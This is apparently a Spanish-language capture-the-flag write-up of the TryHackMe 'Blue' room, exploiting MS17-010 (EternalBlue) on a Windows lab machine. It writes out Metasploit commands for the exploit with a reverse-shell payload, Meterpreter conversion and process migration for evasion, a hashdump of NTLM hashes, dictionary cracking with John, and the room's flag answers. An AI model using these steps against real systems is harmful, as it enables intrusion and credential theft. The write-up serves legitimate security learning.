# TryHackMe — Room: Blue
## EternalBlue (MS17-010) — Writeup completo

**Objetivo:** comprometer una máquina Windows explotando la vulnerabilidad
MS17-010 (EternalBlue) y completar la cadena de ataque hasta post-explotación.

**Sistema objetivo:** Windows Server 2012 R2 Datacenter x64
**Dificultad:** Easy
**Técnicas:** Network scanning, SMB exploitation, privilege escalation,
credential dumping, password cracking

---

## Cadena de ataque completa

```
Reconocimiento (Nmap)
    → Identificación de vulnerabilidad (MS17-010)
        → Explotación (EternalBlue via Metasploit)
            → Acceso como NT AUTHORITY\SYSTEM
                → Conversión shell → Meterpreter
                    → Migración de proceso
                        → Extracción de hashes (hashdump)
                            → Cracking de contraseña (John the Ripper)
                                → Exfiltración de flags
```

---

## Task 1 — Reconocimiento

### Escaneo de puertos y vulnerabilidades
```bash
sudo nmap -Pn -sV -O <IP> --script vuln
```

**Puertos abiertos por debajo del 1000:**

| Puerto | Servicio | Versión |
|---|---|---|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | Windows Server 2012 R2 microsoft-ds |

**Respuesta:** 3 puertos abiertos bajo el 1000.

**Vulnerabilidad identificada por Nmap:**
```
smb-vuln-ms17-010: VULNERABLE
Remote Code Execution vulnerability in Microsoft SMBv1 servers
CVE: CVE-2017-0143
Risk factor: HIGH
```

**Respuesta:** ms17-010

### Por qué esta vulnerabilidad es crítica
EternalBlue explota un buffer overflow en SMBv1 de Windows. Fue
desarrollado por la NSA, filtrado por Shadow Brokers en abril 2017
y usado por WannaCry en mayo 2017 para infectar 200,000 sistemas
en 150 países. Permite RCE sin credenciales con privilegios de SYSTEM.

---

## Task 2 — Explotación con Metasploit

### Configuración del exploit
```
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <IP>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST <IP-tun0>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

**Parámetro requerido:** RHOSTS (IP del sistema objetivo)

**Nota importante:** LHOST debe configurarse con la IP de la interfaz
`tun0` (VPN de TryHackMe), no la IP local de WiFi. Sin esto el sistema
víctima intenta conectarse a una IP inaccesible y la sesión no se abre.

### Resultado de la explotación
```
[+] Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Datacenter 9600 x64
[+] got good NT Trans response
[+] SMB1 session setup allocate nonpaged pool success
[*] Command shell session opened
```

### Verificación de privilegios
```
C:\Windows\system32> whoami
nt authority\system
```

**Acceso obtenido como NT AUTHORITY\SYSTEM** — nivel de privilegio
más alto en Windows, por encima de Administrator.

---

## Task 3 — Conversión a Meterpreter y migración

### Por qué convertir a Meterpreter
La shell básica (`cmd.exe`) solo permite comandos de Windows.
Meterpreter es un agente completo que corre en memoria, tiene
comandos propios de post-explotación, tráfico cifrado y es
más difícil de detectar que una shell convencional.

### Conversión de shell a Meterpreter
```
# Backgroundear la shell actual
CTRL + Z

# Cargar el módulo de conversión
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run

# Seleccionar la nueva sesión de Meterpreter
msf6 > sessions -i <número-sesión-meterpreter>
```

### Verificación de privilegios en Meterpreter
```
meterpreter > getsystem
...already running as SYSTEM

meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

### Migración de proceso
```
meterpreter > ps
# Identificar proceso estable corriendo como SYSTEM

meterpreter > migrate 588
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Proceso destino:** `spoolsv.exe` (PID: 588)

**Por qué migrar a spoolsv.exe:** es el servicio de cola de impresión
de Windows, siempre activo, corre como SYSTEM y raramente es
terminado por antivirus. Migrar hace la sesión más estable y persistente.

---

## Task 4 — Extracción y cracking de credenciales

### Extracción de hashes con hashdump
```
meterpreter > hashdump
```

**Hashes extraídos:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Formato:** `usuario:RID:hash_LM:hash_NTLM:::`

**Análisis:**
- RID 500 → Administrator (cuenta built-in, siempre es 500)
- RID 501 → Guest (cuenta de invitado, siempre es 501)
- RID 1002 → Jon — **usuario no predeterminado, creado manualmente**
- Hash LM `aad3b435...` idéntico en todos → LM hashing desactivado
- Hash NTLM de Guest `31d6cfe0...` → hash estándar de contraseña vacía

**Usuario no predeterminado:** Jon

### Cracking del hash NTLM de Jon
```bash
echo "Jon:ffb43f0de35be4d9917ac0cc8ad57f8d" > jon_hash.txt

john --format=NT \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     jon_hash.txt
```

**Contraseña crackeada:** `alqfna22`

**Cómo funciona el cracking:**
John toma cada palabra de rockyou.txt (14 millones de contraseñas
reales), le aplica la función hash NTLM y compara con el hash objetivo.
Cuando coincide, encontró la contraseña original. No es descifrado
matemático — es comparación por fuerza bruta/diccionario.

---

## Task 5 — Localización de flags

### Flag 1 — System root
**Ubicación:** `C:\`
**Comando:**
```
C:\> type C:\flag1.txt
```
**Flag:** `flag{access_the_machine}`

**Por qué aquí:** `C:\` es la raíz del sistema (system root) en Windows,
equivalente a `/` en Linux.

### Flag 2 — Almacenamiento de contraseñas
**Ubicación:** `C:\Windows\System32\config\`
**Comando:**
```
C:\> type C:\Windows\System32\config\flag2.txt
```
**Flag:** `flag{sam_database_elevated_access}`

**Por qué aquí:** esta carpeta contiene la base de datos SAM donde
Windows almacena los hashes de contraseñas. Solo accesible con
privilegios de SYSTEM — de ahí el nombre de la flag.

### Flag 3 — Documentos del administrador
**Ubicación:** `C:\Users\Jon\Documents\` o `C:\Users\Jon\Desktop\`
**Comando:**
```
C:\> type C:\Users\Jon\Documents\flag3.txt
```
**Flag:** `flag{admin_documents_can_be_valuable}`

**Por qué aquí:** los documentos de usuarios administradores son
objetivos de alto valor en post-explotación — credenciales guardadas,
documentos confidenciales, claves de acceso a otros sistemas.

---

## Lecciones aprendidas

| Concepto | Aplicación en este lab |
|---|---|
| Reconocimiento con Nmap | Identificó MS17-010 antes de explotar |
| EternalBlue (MS17-010) | RCE sin credenciales via SMBv1 |
| Metasploit Framework | Automatización del exploit y post-explotación |
| Reverse shell vs Bind shell | LHOST debe ser IP de tun0, no WiFi |
| Meterpreter vs shell básica | Meterpreter permite post-explotación avanzada |
| Migración de proceso | Mayor estabilidad y evasión |
| hashdump | Extracción de hashes desde memoria (lsass) |
| John the Ripper + rockyou.txt | Cracking de hashes NTLM por diccionario |

## Herramientas usadas
- Nmap 7.99 con `--script vuln`
- Metasploit Framework 6.5.3
- John the Ripper
- rockyou.txt (14M contraseñas)
